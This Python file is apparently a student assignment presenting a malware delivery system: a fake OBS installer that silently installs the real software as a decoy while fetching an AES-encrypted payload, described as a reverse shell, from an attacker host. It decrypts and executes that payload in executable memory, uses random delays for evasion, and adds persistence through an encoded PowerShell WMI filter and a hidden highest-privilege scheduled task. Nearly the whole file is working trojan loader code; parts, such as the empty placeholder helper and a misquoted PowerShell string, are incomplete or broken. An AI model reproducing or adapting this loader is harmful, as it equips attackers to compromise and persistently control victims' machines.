"""
Author: Christopher Jones
Assignment 4 - Serious Malware
Description: Malware delivery system (fake OBS installer + AES-encrypted reverse shell).
"""

import os
import base64
import ctypes
import subprocess
import time
import random
import string
from Crypto.Cipher import AES

ENCRYPTION_KEY = bytes.fromhex("39c73d5679f7d562bc482d2d1ab24025")

def download_with_wininet(url):
    try:
        h_internet = ctypes.windll.wininet.InternetOpenW("Mozilla/5.0", 1, None, None, 0)
        h_url = ctypes.windll.wininet.InternetOpenUrlW(h_internet, url, None, 0, 0x80000000, 0)
        buffer = ctypes.create_string_buffer(4096)
        bytes_read = ctypes.c_ulong(0)
        data = b""
        while ctypes.windll.wininet.InternetReadFile(h_url, buffer, len(buffer), ctypes.byref(bytes_read)) and bytes_read.value:
            data += buffer.raw[:bytes_read.value]
        ctypes.windll.wininet.InternetCloseHandle(h_url)
        ctypes.windll.wininet.InternetCloseHandle(h_internet)
        return data
    except:
        return None

def random_sleep(min_seconds=1, max_seconds=5):
    time.sleep(random.uniform(min_seconds, max_seconds))

def decrypt_payload(encrypted_payload):
    try:
        payload = base64.b64decode(encrypted_payload)
        nonce, ciphertext, tag = payload[:16], payload[16:-16], payload[-16:]
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)
    except:
        return None

def execute_in_memory(payload_data):
    try:
        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
        addr = ctypes.windll.kernel32.VirtualAlloc(None, len(payload_data), 0x3000, 0x40)
        if not addr:
            raise MemoryError("Failed to allocate memory")
        ctypes.windll.kernel32.RtlMoveMemory(addr, payload_data, len(payload_data))
        ctypes.cast(addr, ctypes.CFUNCTYPE(None))()
    except Exception as e:
        print(f"Error executing payload in memory: {e}")

def add_wmi_persistence():
    command = "powershell -c "New-EventFilter -Name MalwareFilter -Query 'SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA \"Win32_Process\"' -Namespace 'Root\\Subscription'""
    encoded_command = base64.b64encode(command.encode('utf-16le')).decode('utf-8')
    subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded_command],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

def add_task_scheduler_persistence(payload_path):
    try:
        task_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        subprocess.run(["schtasks", "/create", "/tn", task_name, "/tr", f'"{payload_path}"', "/sc", "onlogon", "/rl", "highest"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"Error adding Task Scheduler persistence: {e}")

def main():
    obs_url = "https://cdn-fastly.obsproject.com/downloads/OBS-Studio-31.0.0-Windows-Installer.exe"
    encrypted_payload_url = "http://192.168.174.141:8080/OBS1"

    random_sleep()
    obs_installer = download_with_wininet(obs_url)
    obs_install_dir = "C:\\Program Files\\obs-studio"
    if obs_installer:
        installer_path = os.path.join(obs_install_dir, ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + ".exe")
        os.makedirs(obs_install_dir, exist_ok=True)
        with open(installer_path, 'wb') as f:
            f.write(obs_installer)
        subprocess.run([installer_path, '/S'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
        if os.path.exists(installer_path):
            os.remove(installer_path)

    random_sleep()
    encrypted_payload = download_with_wininet(encrypted_payload_url)
    if encrypted_payload:
        payload = decrypt_payload(encrypted_payload)
        if payload:
            execute_in_memory(payload)

    random_sleep()
    payload_path = os.path.join(obs_install_dir, "obs_helper.exe")
    with open(payload_path, 'wb') as f:
        f.write(b"")  # placeholder
    add_wmi_persistence()
    add_task_scheduler_persistence(payload_path)

if __name__ == "__main__":
    main()
